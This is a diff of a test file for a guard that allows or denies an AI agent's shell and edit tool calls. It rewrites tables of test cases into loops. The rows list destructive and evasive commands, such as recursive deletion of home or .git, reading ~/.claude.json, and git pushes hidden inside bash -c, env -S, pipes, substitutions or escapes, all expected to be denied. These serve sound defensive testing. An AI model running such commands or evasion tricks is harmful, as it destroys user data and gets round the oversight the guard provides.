-    { name: 'npx -y vercel --prod', command: 'npx -y vercel --prod', decision: 'deny' },
-    {
-      name: 'pnpm --filter x dlx vercel --prod',
-      command: 'pnpm --filter x dlx vercel --prod',
-      decision: 'deny',
-    },
-    { name: 'git diff --output=file', command: 'git diff --output=out.txt', decision: 'deny' },
-    { name: 'git diff --output file', command: 'git diff --output out.txt', decision: 'deny' },
-    { name: 'git log --output=file', command: 'git log --output=out.txt', decision: 'deny' },
-    { name: 'git show --output=file', command: 'git show HEAD --output=out.txt', decision: 'deny' },
-    { name: 'git grep -O<cmd>', command: 'git grep -Osh foo', decision: 'deny' },
-    {
-      name: 'git grep --open-files-in-pager=cmd',
-      command: 'git grep --open-files-in-pager=sh foo',
-      decision: 'deny',
-    },
-    {
-      name: 'git grep --open-files-in-pager',
-      command: 'git grep --open-files-in-pager foo',
-      decision: 'deny',
-    },
-    {
-      name: 'git grep --open=sh (abbreviation)',
-      command: "git grep --open='touch X;true' foo",
-      decision: 'deny',
-    },
-    {
-      name: 'git grep --open-files-in-p=sh',
-      command: 'git grep --open-files-in-p=sh foo',
-      decision: 'deny',
-    },
-    { name: 'git grep --o=sh', command: 'git grep --o=sh foo', decision: 'deny' },
-    { name: 'git grep -nO bundled', command: "git grep -nO'touch X;true' foo", decision: 'deny' },
-    { name: 'git grep -iO with separate value', command: 'git grep -iO sh foo', decision: 'deny' },
-    {
-      name: 'git grep -1O context digit before O',
-      command: "git grep -1O'touch X;true' foo",
-      decision: 'deny',
-    },
-    {
-      name: 'git grep -n1O letter and digit before O',
-      command: "git grep -n1O'touch X;true' foo",
-      decision: 'deny',
-    },
-    { name: 'git grep -12O two digits before O', command: 'git grep -12Osh foo', decision: 'deny' },
-    { name: 'git grep -eO bundled pattern', command: 'git grep -eO foo', decision: 'deny' },
-    {
-      name: 'git diff --out=file (abbreviation)',
-      command: 'git diff --out=x.txt',
-      decision: 'deny',
-    },
-    { name: 'git grep -n foo', command: 'git grep -n foo', decision: 'allow' },
-    { name: 'git grep -i foo', command: 'git grep -i foo', decision: 'allow' },
-    { name: 'git grep -e with an O pattern', command: 'git grep -e Opattern', decision: 'allow' },
-    { name: 'git grep -w -i -n foo', command: 'git grep -w -i -n foo', decision: 'allow' },
-    { name: 'git grep -c foo', command: 'git grep -c foo', decision: 'allow' },
-    { name: 'git grep -E foo', command: 'git grep -E foo', decision: 'allow' },
-    { name: 'git grep -e O as separate words', command: 'git grep -e O foo', decision: 'allow' },
-    {
-      name: 'git grep --only-matching foo',
-      command: 'git grep --only-matching foo',
-      decision: 'allow',
-    },
-    { name: 'plain git diff', command: 'git diff', decision: 'allow' },
-    {
-      name: 'git diff --output-indicator-new',
-      command: 'git diff --output-indicator-new=+',
-      decision: 'allow',
-    },
-    { name: 'plain git log', command: 'git log', decision: 'allow' },
-    { name: 'git grep foo', command: 'git grep foo', decision: 'allow' },
-    { name: 'a subcommand that only starts like add', command: 'pnpm addons', decision: 'allow' },
-  ])('$name: $command -> $decision', ({ command, decision }) => {
-    expect(bash(command).decision).toBe(decision);
+  it('judges git, rm -r, deploys, hazards and wrappers in each shell command', () => {
+    const rows: { name: string; command: string; decision: 'allow' | 'deny' }[] = [
+      { name: 'read-only git status', command: 'git status --short', decision: 'allow' },
+      { name: 'read-only git diff', command: 'git diff HEAD~1 -- src', decision: 'allow' },
+      { name: 'read-only git log', command: 'git log --oneline -5', decision: 'allow' },
+      { name: 'listing branches', command: 'git branch', decision: 'allow' },
+      { name: 'push a feature branch', command: 'git push origin feat/x', decision: 'deny' },
+      { name: 'test runner', command: 'pnpm vitest run', decision: 'allow' },
+      { name: 'rm -rf inside the repo', command: 'rm -rf build', decision: 'allow' },
+      { name: 'direct commit', command: "git commit -m 'x'", decision: 'deny' },
+      { name: 'git add dot', command: 'git add .', decision: 'deny' },
+      { name: 'git add a path', command: 'git add src/api/a.ts', decision: 'deny' },
+      { name: 'checkout', command: 'git checkout main', decision: 'deny' },
+      { name: 'switch', command: 'git switch -c x', decision: 'deny' },
+      { name: 'stash', command: 'git stash', decision: 'deny' },
+      { name: 'hard reset', command: 'git reset --hard', decision: 'deny' },
+      { name: 'branch delete', command: 'git branch -D old', decision: 'deny' },
+      { name: 'pull', command: 'git pull', decision: 'deny' },
+      { name: 'force push', command: 'git push --force origin feat/x', decision: 'deny' },
+      { name: 'push to main', command: 'git push origin main', decision: 'deny' },
+      { name: 'push HEAD to master', command: 'git push origin HEAD:master', decision: 'deny' },
+      {
+        name: 'commit in another directory',
+        command: 'git -C ../other commit -m x',
+        decision: 'deny',
+      },
+      { name: 'commit after cd', command: "cd src && git commit -m 'x'", decision: 'deny' },
+      { name: 'reset inside bash -c', command: 'bash -c "git reset --hard"', decision: 'deny' },
+      {
+        name: 'reset inside bash -c after an option',
+        command: "bash -c -e 'git push --force origin main'",
+        decision: 'deny',
+      },
+      {
+        name: 'reset inside bash -c after --',
+        command: "sh -c -- 'git push --force origin main'",
+        decision: 'deny',
+      },
+      {
+        name: 'reset inside bash -c after -o and its value',
+        command: "bash -c -o pipefail 'git push --force origin main'",
+        decision: 'deny',
+      },
+      {
+        name: 'push in bash -c after a lone dash',
+        command: "bash -c - 'git push --force origin main'",
+        decision: 'deny',
+      },
+      {
+        name: 'push in a here-string on fd 0',
+        command: "bash /dev/stdin 0<<<'git push --force origin main'",
+        decision: 'deny',
+      },
+      {
+        name: 'checkout in a $() substitution',
+        command: 'echo $(git checkout .)',
+        decision: 'deny',
+      },
+      { name: 'stash in a backtick substitution', command: 'echo `git stash`', decision: 'deny' },
+      {
+        name: 'checkout behind env and an assignment',
+        command: 'FOO=1 env git checkout .',
+        decision: 'deny',
+      },
+      { name: 'rm -rf in /tmp', command: 'rm -rf /tmp/x', decision: 'deny' },
+      { name: 'rm -rf in home', command: 'rm -rf ~/projects', decision: 'deny' },
+      { name: 'rm -rf the repo', command: 'rm -rf .', decision: 'deny' },
+      { name: 'rm -rf a sibling', command: 'rm -rf ../sibling', decision: 'deny' },
+      { name: 'vercel prod deploy', command: 'vercel deploy --prod', decision: 'deny' },
+      { name: 'pnpm publish', command: 'pnpm publish', decision: 'deny' },
+      { name: 'terraform apply', command: 'terraform apply', decision: 'deny' },
+      { name: 'sudo', command: 'sudo ls', decision: 'deny' },
+      { name: 'env split string', command: "env -S 'git status'", decision: 'deny' },
+      { name: 'env split string in a cluster', command: "env -iS 'rm -rf ~'", decision: 'deny' },
+      {
+        name: 'env long split string',
+        command: "env --split-string='git status'",
+        decision: 'deny',
+      },
+      {
+        name: 'env abbreviated split string',
+        command: "env --split='cat ~/.claude.json'",
+        decision: 'deny',
+      },
+      {
+        name: 'env split string behind nice',
+        command: "nice env -S 'git status'",
+        decision: 'deny',
+      },
+      {
+        name: 'env split string before a command',
+        command: "env -S 'rm -rf ~' true",
+        decision: 'deny',
+      },
+      {
+        name: 'env split string in a cluster before a command',
+        command: "env -iS 'git checkout .' true",
+        decision: 'deny',
+      },
+      {
+        name: 'env long split string before a command',
+        command: "env --split-string='git checkout .' true",
+        decision: 'deny',
+      },
+      {
+        name: 'env abbreviated split string before a command',
+        command: "env --split='git checkout .' true",
+        decision: 'deny',
+      },
+      {
+        name: 'env unsetting a variable named S',
+        command: 'env -uS git status',
+        decision: 'allow',
+      },
+      {
+        name: 'env with an abbreviated long option',
+        command: "env --uns X bash -c 'rm -rf ~'",
+        decision: 'deny',
+      },
+      {
+        name: 'env with an unknown long option',
+        command: 'env --frob git status',
+        decision: 'deny',
+      },
+      { name: 'env -u', command: 'env -u FOO git status', decision: 'allow' },
+      { name: 'env --unset in full', command: 'env --unset FOO git status', decision: 'allow' },
+      { name: 'env --unset= in full', command: 'env --unset=FOO git status', decision: 'allow' },
+      { name: 'env ending its options', command: 'env -- git status', decision: 'allow' },
+      { name: 'pnpm add', command: 'pnpm add zod', decision: 'deny' },
+      { name: 'pnpm add with -w', command: 'pnpm -w add zod', decision: 'deny' },
+      {
+        name: 'pnpm add with --filter value',
+        command: 'pnpm --filter @10db/db add zod',
+        decision: 'deny',
+      },
+      {
+        name: 'pnpm remove with --filter=value',
+        command: 'pnpm --filter=@10db/db remove zod',
+        decision: 'deny',
+      },
+      { name: 'pnpm i', command: 'pnpm i', decision: 'deny' },
+      {
+        name: 'pnpm install with a flag',
+        command: 'pnpm install --frozen-lockfile',
+        decision: 'deny',
+      },
+      { name: 'npm i', command: 'npm i left-pad', decision: 'deny' },
+      {
+        name: 'drizzle-kit through pnpm exec',
+        command: 'pnpm exec drizzle-kit generate',
+        decision: 'deny',
+      },
+      {
+        name: 'db:migrate with a filter',
+        command: 'pnpm --filter @10db/db db:migrate',
+        decision: 'deny',
+      },
+      { name: 'filtered test run', command: 'pnpm --filter @10db/db test', decision: 'allow' },
+      { name: 'single & as a separator', command: 'true & git commit -m x', decision: 'deny' },
+      { name: 'subshell', command: '(git commit -m x)', decision: 'deny' },
+      { name: 'brace group', command: '{ git commit -m x; }', decision: 'deny' },
+      { name: 'absolute path to git', command: '/usr/bin/git commit -m x', decision: 'deny' },
+      { name: 'backslash-escaped git', command: '\\git commit -m x', decision: 'deny' },
+      { name: 'absolute path to rm', command: '/bin/rm -rf /tmp/x', decision: 'deny' },
+      { name: 'bash with combined -lc', command: 'bash -lc "git reset --hard"', decision: 'deny' },
+      { name: 'env with a flag', command: 'env -i git commit -m x', decision: 'deny' },
+      { name: 'env with a valued flag', command: 'env -u FOO git commit -m x', decision: 'deny' },
+      { name: 'time with a flag', command: 'time -p git commit -m x', decision: 'deny' },
+      { name: 'xargs wrapper', command: 'xargs git commit -m x', decision: 'deny' },
+      { name: 'xargs with a valued flag', command: 'xargs -n 1 git commit -m x', decision: 'deny' },
+      { name: 'pipe into sh', command: 'echo "git reset --hard" | sh', decision: 'deny' },
+      { name: 'pipe into bash with flags', command: 'cat x | bash -e', decision: 'deny' },
+      { name: 'stderr redirect is not a separator', command: 'git status 2>&1', decision: 'allow' },
+      {
+        name: 'parameter expansion braces are not a group',
+        command: 'echo ${HOME}',
+        decision: 'allow',
+      },
+      { name: 'git with --git-dir', command: 'git --git-dir .git commit -m x', decision: 'deny' },
+      { name: 'git with --git-dir=', command: 'git --git-dir=.git status', decision: 'deny' },
+      { name: 'git with --work-tree', command: 'git --work-tree . commit -m x', decision: 'deny' },
+      { name: 'git with --namespace', command: 'git --namespace x status', decision: 'deny' },
+      { name: 'git with -c config', command: 'git -c alias.s=!sh status', decision: 'deny' },
+      { name: 'git alias verb', command: 'git c -m x', decision: 'deny' },
+      {
+        name: 'git symbolic-ref',
+        command: 'git symbolic-ref HEAD refs/heads/other',
+        decision: 'deny',
+      },
+      { name: 'git config', command: 'git config alias.c commit', decision: 'deny' },
+      { name: 'git fetch', command: 'git fetch origin', decision: 'deny' },
+      { name: 'git tag create', command: 'git tag v1', decision: 'deny' },
+      {
+        name: 'git -C with a read-only verb',
+        command: 'git -C ../other status',
+        decision: 'allow',
+      },
+      { name: 'git show', command: 'git show HEAD', decision: 'allow' },
+      { name: 'git branch --list', command: 'git branch --list', decision: 'allow' },
+      { name: 'push -d', command: 'git push -d origin feat', decision: 'deny' },
+      { name: 'push colon refspec delete', command: 'git push origin :feat', decision: 'deny' },
+      { name: 'push -fu', command: 'git push -fu origin feat', decision: 'deny' },
+      { name: 'push --mirror', command: 'git push --mirror', decision: 'deny' },
+      { name: 'push --all', command: 'git push --all origin', decision: 'deny' },
+      { name: 'push --delete', command: 'git push --delete origin feat', decision: 'deny' },
+      { name: 'push +refspec', command: 'git push origin +feat', decision: 'deny' },
+      { name: 'push -u', command: 'git push -u origin feat', decision: 'deny' },
+      { name: 'pnpm -r publish', command: 'pnpm -r publish', decision: 'deny' },
+      { name: 'pnpm --filter publish', command: 'pnpm --filter x publish', decision: 'deny' },
+      { name: 'npx vercel deploy --prod', command: 'npx vercel deploy --prod', decision: 'deny' },
+      { name: 'pnpm dlx vercel --prod', command: 'pnpm dlx vercel --prod', decision: 'deny' },
+      { name: 'rm -rf with $HOME', command: 'rm -rf $HOME/projects', decision: 'deny' },
+      { name: 'rm -rf with quoted $HOME', command: 'rm -rf "$HOME"', decision: 'deny' },
+      { name: 'rm -rf .git', command: 'rm -rf .git', decision: 'deny' },
+      { name: 'rm -rf nested .git', command: 'rm -rf sub/.git/hooks', decision: 'deny' },
+      { name: 'rm -r after cd', command: 'cd .. && rm -rf sibling', decision: 'deny' },
+      { name: 'rm -r --recursive form', command: 'rm --recursive ../x', decision: 'deny' },
+      {
+        name: 'rm --force of a file is not recursive',
+        command: 'rm --force build/a.txt',
+        decision: 'allow',
+      },
+      {
+        name: 'rm -r of a dotfile that merely starts with .git',
+        command: 'rm -rf .github/tmp',
+        decision: 'allow',
+      },
+      { name: 'push to heads/main', command: 'git push origin heads/main', decision: 'deny' },
+      {
+        name: 'push feat:heads/main',
+        command: 'git push origin feat:heads/main',
+        decision: 'deny',
+      },
+      {
+        name: 'push feat:refs/heads/main',
+        command: 'git push origin feat:refs/heads/main',
+        decision: 'deny',
+      },
+      {
+        name: 'push refs/heads/master',
+        command: 'git push origin refs/heads/master',
+        decision: 'deny',
+      },
+      { name: 'npx -y vercel --prod', command: 'npx -y vercel --prod', decision: 'deny' },
+      {
+        name: 'pnpm --filter x dlx vercel --prod',
+        command: 'pnpm --filter x dlx vercel --prod',
+        decision: 'deny',
+      },
+      { name: 'git diff --output=file', command: 'git diff --output=out.txt', decision: 'deny' },
+      { name: 'git diff --output file', command: 'git diff --output out.txt', decision: 'deny' },
+      { name: 'git log --output=file', command: 'git log --output=out.txt', decision: 'deny' },
+      {
+        name: 'git show --output=file',
+        command: 'git show HEAD --output=out.txt',
+        decision: 'deny',
+      },
+      { name: 'git grep -O<cmd>', command: 'git grep -Osh foo', decision: 'deny' },
+      {
+        name: 'git grep --open-files-in-pager=cmd',
+        command: 'git grep --open-files-in-pager=sh foo',
+        decision: 'deny',
+      },
+      {
+        name: 'git grep --open-files-in-pager',
+        command: 'git grep --open-files-in-pager foo',
+        decision: 'deny',
+      },
+      {
+        name: 'git grep --open=sh (abbreviation)',
+        command: "git grep --open='touch X;true' foo",
+        decision: 'deny',
+      },
+      {
+        name: 'git grep --open-files-in-p=sh',
+        command: 'git grep --open-files-in-p=sh foo',
+        decision: 'deny',
+      },
+      { name: 'git grep --o=sh', command: 'git grep --o=sh foo', decision: 'deny' },
+      { name: 'git grep -nO bundled', command: "git grep -nO'touch X;true' foo", decision: 'deny' },
+      {
+        name: 'git grep -iO with separate value',
+        command: 'git grep -iO sh foo',
+        decision: 'deny',
+      },
+      {
+        name: 'git grep -1O context digit before O',
+        command: "git grep -1O'touch X;true' foo",
+        decision: 'deny',
+      },
+      {
+        name: 'git grep -n1O letter and digit before O',
+        command: "git grep -n1O'touch X;true' foo",
+        decision: 'deny',
+      },
+      {
+        name: 'git grep -12O two digits before O',
+        command: 'git grep -12Osh foo',
+        decision: 'deny',
+      },
+      { name: 'git grep -eO bundled pattern', command: 'git grep -eO foo', decision: 'deny' },
+      {
+        name: 'git diff --out=file (abbreviation)',
+        command: 'git diff --out=x.txt',
+        decision: 'deny',
+      },
+      { name: 'git grep -n foo', command: 'git grep -n foo', decision: 'allow' },
+      { name: 'git grep -i foo', command: 'git grep -i foo', decision: 'allow' },
+      { name: 'git grep -e with an O pattern', command: 'git grep -e Opattern', decision: 'allow' },
+      { name: 'git grep -w -i -n foo', command: 'git grep -w -i -n foo', decision: 'allow' },
+      { name: 'git grep -c foo', command: 'git grep -c foo', decision: 'allow' },
+      { name: 'git grep -E foo', command: 'git grep -E foo', decision: 'allow' },
+      { name: 'git grep -e O as separate words', command: 'git grep -e O foo', decision: 'allow' },
+      {
+        name: 'git grep --only-matching foo',
+        command: 'git grep --only-matching foo',
+        decision: 'allow',
+      },
+      { name: 'plain git diff', command: 'git diff', decision: 'allow' },
+      {
+        name: 'git diff --output-indicator-new',
+        command: 'git diff --output-indicator-new=+',
+        decision: 'allow',
+      },
+      { name: 'plain git log', command: 'git log', decision: 'allow' },
+      { name: 'git grep foo', command: 'git grep foo', decision: 'allow' },
+      { name: 'a subcommand that only starts like add', command: 'pnpm addons', decision: 'allow' },
+    ];
+    for (const { name, command, decision } of rows) {
+      expect.soft(bash(command).decision, `${name}: ${command}`).toBe(decision);
+    }
   });
 
   it('allows a hazard command when the hazard is claimed', () => {
     expect(bash('pnpm add zod', [{ kind: 'hazard', name: 'deps' }]).decision).toBe('allow');
   });
 
-  it('points direct commits at the commit tool', () => {
-    const verdict = bash("git commit -m 'x'");
-    expect(verdict.decision === 'deny' && verdict.reason).toContain('commit tool');
-  });
-
-  it('tells the agent how to pass a pattern starting with O to git grep', () => {
-    const verdict = bash('git grep -eO foo');
-    expect(verdict.decision === 'deny' && verdict.reason).toContain('-e O');
+  it('says what to do instead of a direct commit or a git grep -O pattern', () => {
+    const commit = bash("git commit -m 'x'");
+    expect(commit.decision === 'deny' && commit.reason).toContain('commit tool');
+    const grep = bash('git grep -eO foo');
+    expect(grep.decision === 'deny' && grep.reason).toContain('-e O');
   });
 
   it('tells a read-only step why a git option is refused', () => {
@@ -815,16 +867,19 @@ describe('splitCommand', () => {
 });
 
 describe('stripCommandPrefixes', () => {
-  it.each<{ name: string; words: string[]; expected: string[] }>([
-    {
-      name: 'assignment and env',
-      words: ['FOO=1', 'env', 'git', 'status'],
-      expected: ['git', 'status'],
-    },
-    { name: 'nohup and time', words: ['nohup', 'time', 'ls'], expected: ['ls'] },
-    { name: 'a plain command', words: ['ls', 'FOO=1'], expected: ['ls', 'FOO=1'] },
-  ])('$name', ({ words, expected }) => {
-    expect(stripCommandPrefixes(words)).toEqual(expected);
+  it('strips leading assignments and wrappers, and nothing after the command', () => {
+    const rows: { name: string; words: string[]; expected: string[] }[] = [
+      {
+        name: 'assignment and env',
+        words: ['FOO=1', 'env', 'git', 'status'],
+        expected: ['git', 'status'],
+      },
+      { name: 'nohup and time', words: ['nohup', 'time', 'ls'], expected: ['ls'] },
+      { name: 'a plain command', words: ['ls', 'FOO=1'], expected: ['ls', 'FOO=1'] },
+    ];
+    for (const { name, words, expected } of rows) {
+      expect.soft(stripCommandPrefixes(words), name).toEqual(expected);
+    }
   });
 });
 
@@ -854,10 +909,7 @@ describe('resolveInRepo', () => {
   });
 });
 
-describe.each([
-  { setup: 'narrow areas', areas: AREAS, claim: 'api' },
-  { setup: 'a ** area', areas: [{ name: 'repo', globs: ['**'] }], claim: 'repo' },
-])('paths that climb out of a link ($setup)', ({ areas, claim }) => {
+describe('paths that climb out of a link', () => {
   const own = tempDir('guard-climb-link');
   beforeAll(() => {
     mkdirSync(join(own.path, '.git', 'hooks'), { recursive: true });
@@ -871,41 +923,42 @@ describe.each([
   afterAll(() => {
     own.cleanup();
   });
-  const run = (toolName: string, toolInput: unknown) =>
-    judgeToolUse({
-      judge: JudgeKind.Rules,
-      coveredByAllowRule: false,
-      toolName,
-      toolInput,
-      repoPath: own.path,
-      areas,
-      hazards: DEFAULT_HAZARDS,
-      claims: [{ kind: 'area', name: claim }],
-      readOnly: false,
-      protectedPaths: guarded(),
-    });
-
-  it('denies rm -rf of a path that reaches .git through a link', () => {
-    expect(run('Bash', { command: 'rm -rf a/../objects' })).toEqual({
-      decision: 'deny',
-      reason: 'rm -r of a .git path is never allowed.',
-    });
-  });
-
-  it('denies an edit whose text is claimed but whose kernel reading is .git', () => {
-    expect(run('Edit', { file_path: 'src/api/lnk/../x.ts' }).decision).toBe('deny');
-  });
-
-  it('denies an edit of a path that reaches .git/config through a link', () => {
-    expect(run('Edit', { file_path: 'a/../config' }).decision).toBe('deny');
-  });
-
-  it('still allows a plain .. inside an area', () => {
-    expect(run('Edit', { file_path: 'src/api/../api/a.ts' })).toEqual({ decision: 'allow' });
-  });
-
-  it('still allows rm -rf of an ordinary directory through a plain ..', () => {
-    expect(run('Bash', { command: 'rm -rf src/api/../api' })).toEqual({ decision: 'allow' });
+  it('denies a path whose kernel reading reaches .git, with narrow areas or a ** area', () => {
+    const setups = [
+      { setup: 'narrow areas', areas: AREAS, claim: 'api' },
+      { setup: 'a ** area', areas: [{ name: 'repo', globs: ['**'] }], claim: 'repo' },
+    ];
+    for (const { setup, areas, claim } of setups) {
+      const run = (toolName: string, toolInput: unknown) =>
+        judgeToolUse({
+          judge: JudgeKind.Rules,
+          coveredByAllowRule: false,
+          toolName,
+          toolInput,
+          repoPath: own.path,
+          areas,
+          hazards: DEFAULT_HAZARDS,
+          claims: [{ kind: 'area', name: claim }],
+          readOnly: false,
+          protectedPaths: guarded(),
+        });
+      // rm -rf of a path that reaches .git through a link.
+      expect.soft(run('Bash', { command: 'rm -rf a/../objects' }), setup).toEqual({
+        decision: 'deny',
+        reason: 'rm -r of a .git path is never allowed.',
+      });
+      // An edit whose text is claimed but whose kernel reading is .git.
+      expect.soft(run('Edit', { file_path: 'src/api/lnk/../x.ts' }).decision, setup).toBe('deny');
+      // An edit of a path that reaches .git/config through a link.
+      expect.soft(run('Edit', { file_path: 'a/../config' }).decision, setup).toBe('deny');
+      // A plain .. inside an area, and rm -rf of an ordinary directory through one, stay allowed.
+      expect
+        .soft(run('Edit', { file_path: 'src/api/../api/a.ts' }), setup)
+        .toEqual({ decision: 'allow' });
+      expect
+        .soft(run('Bash', { command: 'rm -rf src/api/../api' }), setup)
+        .toEqual({ decision: 'allow' });
+    }
   });
 });
 
@@ -974,132 +1027,129 @@ describe('rm -r arguments beyond a plain path', () => {
     reason: 'rm -r argument uses shell syntax the guard does not judge; name the paths.',
   };
 
-  it.each([
-    '.gi(t|x)',
-    '.g(i)t',
-    '(.git|y)',
-    '***/p*',
-    '~+/x',
-    '~root/x',
-    '=ls',
-    '*/dist',
-    '**/node_modules',
-    '.?/x',
-    '.*/x',
-    '.gi?',
-    '.g*',
-    '.gi[st]',
-    'dist/*/',
-    'dist/[ab]',
-    '"my dir"',
-  ])('denies rm -rf %s', (arg) => {
-    expect(run(`rm -rf ${arg}`)).toEqual(unjudged);
-  });
-
-  it.each([
-    [
-      'a brace list whose first path leaves the repo',
-      '{~,x}/y',
-      'rm -r of ~/y reaches outside the repository (or is the repository itself).',
-    ],
-    ['a brace list that expands to .git', '.{git,x}', 'rm -r of a .git path is never allowed.'],
-  ])('denies rm -rf %s as the path a brace expands to', (_name, arg, reason) => {
-    expect(run(`rm -rf ${arg}`)).toEqual({ decision: 'deny', reason });
-  });
-
-  it('denies an escaped .git as a .git path: the parser resolves the escape as the shell does', () => {
-    expect(run('rm -rf .gi\\t')).toEqual({
-      decision: 'deny',
-      reason: 'rm -r of a .git path is never allowed.',
-    });
-  });
-
-  it('denies a .. after a wildcard as a path the guard does not judge', () => {
-    expect(run('rm -rf src/*/../x')).toEqual({
-      decision: 'deny',
-      reason: 'rm -r argument uses shell syntax the guard does not judge; name the paths.',
-    });
-  });
-
-  it('denies a wildcard with more than four wildcards quickly, without listing', () => {
+  it('denies rm -r of a word whose paths the guard does not judge, quickly', () => {
+    for (const arg of [
+      '.gi(t|x)',
+      '.g(i)t',
+      '(.git|y)',
+      '***/p*',
+      '~+/x',
+      '~root/x',
+      '=ls',
+      '*/dist',
+      '**/node_modules',
+      '.?/x',
+      '.*/x',
+      '.gi?',
+      '.g*',
+      '.gi[st]',
+      'dist/*/',
+      'dist/[ab]',
+      '"my dir"',
+      // A .. after a wildcard.
+      'src/*/../x',
+    ]) {
+      expect.soft(run(`rm -rf ${arg}`), arg).toEqual(unjudged);
+    }
+    // More than four wildcards are refused without listing the directory.
     const started = performance.now();
     expect(run('rm -rf *a*a*a*a*a*ab')).toEqual(unjudged);
     expect(performance.now() - started).toBeLessThan(100);
   });
 
-  it('denies a wildcard in a directory that holds .git', () => {
-    expect(run('rm -rf *')).toEqual({
-      decision: 'deny',
-      reason: 'rm -r of * could reach the .git beside it; name the paths.',
-    });
+  it('denies rm -r of the path a brace, an escape or a wildcard reaches, naming why', () => {
+    const rows: [string, string, string][] = [
+      [
+        'a brace list whose first path leaves the repo',
+        'rm -rf {~,x}/y',
+        'rm -r of ~/y reaches outside the repository (or is the repository itself).',
+      ],
+      [
+        'a brace list that expands to .git',
+        'rm -rf .{git,x}',
+        'rm -r of a .git path is never allowed.',
+      ],
+      // The parser resolves the escape as the shell does.
+      ['an escaped .git', 'rm -rf .gi\\t', 'rm -r of a .git path is never allowed.'],
+      [
+        'a wildcard in a directory that holds .git',
+        'rm -rf *',
+        'rm -r of * could reach the .git beside it; name the paths.',
+      ],
+    ];
+    for (const [name, command, reason] of rows) {
+      expect.soft(run(command), `${name}: ${command}`).toEqual({ decision: 'deny', reason });
+    }
   });
 
-  it.each(["rm -rf '>' .git", 'rm -rf ">x" .git', "rm -rf '2>/x/../..'"])(
-    'denies %s, whose quoted word only looks like a redirection',
-    (command) => {
-      expect(run(command).decision).toBe('deny');
-    },
-  );
-
-  it('denies a wildcard whose directory is outside the repository', () => {
-    expect(run('rm -rf dist/lk2/*').decision).toBe('deny');
+  it('denies a quoted word that only looks like a redirection, and a wildcard outside the repo', () => {
+    for (const command of [
+      "rm -rf '>' .git",
+      'rm -rf ">x" .git',
+      "rm -rf '2>/x/../..'",
+      'rm -rf dist/lk2/*',
+    ]) {
+      expect.soft(run(command).decision, command).toBe('deny');
+    }
   });
 
-  it.each([
-    'rm -rf dist',
-    'rm -rf dist/*',
-    'rm -rf build/*.o',
-    'rm -rf build/a?c*',
-    'rm -rf src/../dist',
-    'rm -rf src/../dist/*',
-  ])('allows %s', (command) => {
-    expect(run(command)).toEqual({ decision: 'allow' });
+  it('allows rm -r of plain paths and wildcards inside the repo', () => {
+    for (const command of [
+      'rm -rf dist',
+      'rm -rf dist/*',
+      'rm -rf build/*.o',
+      'rm -rf build/a?c*',
+      'rm -rf src/../dist',
+      'rm -rf src/../dist/*',
+      'rm -rf build',
+      'rm -rf -- dist',
+      'rm -rf dist/*.o',
+      'rm -r build -f',
+      'rm -rf dist/*.{o,a}',
+      'rm -rf dist/{a,b}',
+    ]) {
+      expect.soft(run(command), command).toEqual({ decision: 'allow' });
+    }
   });
 
-  it.each([
-    ['a redirection whose target hides an option', 'rm -rf > -x .git'],
-    ['a numbered redirection', 'rm -rf 2> -o ../victim'],
-    ['a redirection of both streams', 'rm -rf &> -x ~'],
-    ['a redirection joined to its target', 'rm -rf build 2>/dev/null'],
-    ['a double star', 'rm -rf dist/**'],
-    ['a triple star', 'rm -rf dist/***'],
-    ['a triple star with a name', 'rm -rf dist/***pkg'],
-    ['a double star inside a name', 'rm -rf dist/a**b'],
-  ])('denies rm -r with %s as unjudged syntax', (_name, command) => {
-    expect(run(command)).toEqual(unjudged);
+  it('denies rm -r with a redirection among its words or a double star as unjudged syntax', () => {
+    const rows: [string, string][] = [
+      ['a redirection whose target hides an option', 'rm -rf > -x .git'],
+      ['a numbered redirection', 'rm -rf 2> -o ../victim'],
+      ['a redirection of both streams', 'rm -rf &> -x ~'],
+      ['a redirection joined to its target', 'rm -rf build 2>/dev/null'],
+      ['a double star', 'rm -rf dist/**'],
+      ['a triple star', 'rm -rf dist/***'],
+      ['a triple star with a name', 'rm -rf dist/***pkg'],
+      ['a double star inside a name', 'rm -rf dist/a**b'],
+    ];
+    for (const [name, command] of rows) {
+      expect.soft(run(command), `${name}: ${command}`).toEqual(unjudged);
+    }
   });
 
-  it.each([
-    [
-      'a dash word after -- that climbs to .git',
-      'rm -rf -- -d/../.git',
-      'rm -r of a .git path is never allowed.',
-    ],
-    [
-      'a dash word after -- that climbs out',
-      'rm -rf -- -d/../../victim',
-      'rm -r of -d/../../victim reaches outside the repository (or is the repository itself).',
-    ],
-    ['.git after --', 'rm -rf -- .git', 'rm -r of a .git path is never allowed.'],
-    [
-      'a dash word after an operand, which BSD rm takes as a path',
-      'rm -rf build -d/../.git',
-      'rm -r of a .git path is never allowed.',
-    ],
-  ])('denies rm -r of %s', (_name, command, reason) => {
-    expect(run(command)).toEqual({ decision: 'deny', reason });
-  });
-
-  it.each([
-    'rm -rf build',
-    'rm -rf -- dist',
-    'rm -rf dist/*',
-    'rm -rf dist/*.o',
-    'rm -r build -f',
-    'rm -rf dist/*.{o,a}',
-    'rm -rf dist/{a,b}',
-  ])('still allows %s', (command) => {
-    expect(run(command)).toEqual({ decision: 'allow' });
+  it('denies rm -r of a dash word or .git after -- or an operand, naming the path', () => {
+    const rows: [string, string, string][] = [
+      [
+        'a dash word after -- that climbs to .git',
+        'rm -rf -- -d/../.git',
+        'rm -r of a .git path is never allowed.',
+      ],
+      [
+        'a dash word after -- that climbs out',
+        'rm -rf -- -d/../../victim',
+        'rm -r of -d/../../victim reaches outside the repository (or is the repository itself).',
+      ],
+      ['.git after --', 'rm -rf -- .git', 'rm -r of a .git path is never allowed.'],
+      [
+        'a dash word after an operand, which BSD rm takes as a path',
+        'rm -rf build -d/../.git',
+        'rm -r of a .git path is never allowed.',
+      ],
+    ];
+    for (const [name, command, reason] of rows) {
+      expect.soft(run(command), `${name}: ${command}`).toEqual({ decision: 'deny', reason });
+    }
   });
 
   const unread = {
@@ -1108,264 +1158,271 @@ describe('rm -r arguments beyond a plain path', () => {
       "The command has words the guard cannot read: an ANSI-C escape it does not decode (such as $'\\q' or a NUL), a / or newline decoded inside a word, or a lone { or } in the middle of a command. Write the words plainly.",
   };
 
-  it.each([
-    ['a hex escape that spells .git', "rm -rf $'\\x2egit'"],
-    ['an octal escape that spells .git', "rm -rf $'\\056git'"],
-    ['a Unicode escape that spells .git', "rm -rf $'\\u002egit'"],
-    ['hex escapes for every letter of .git', "rm -rf $'\\x2e\\x67\\x69\\x74'"],
-    ['a hex escape that spells the flags', "rm $'\\x2drf' .git"],
-    ['a hex escape inside the flags', "rm -$'\\x72'f .git"],
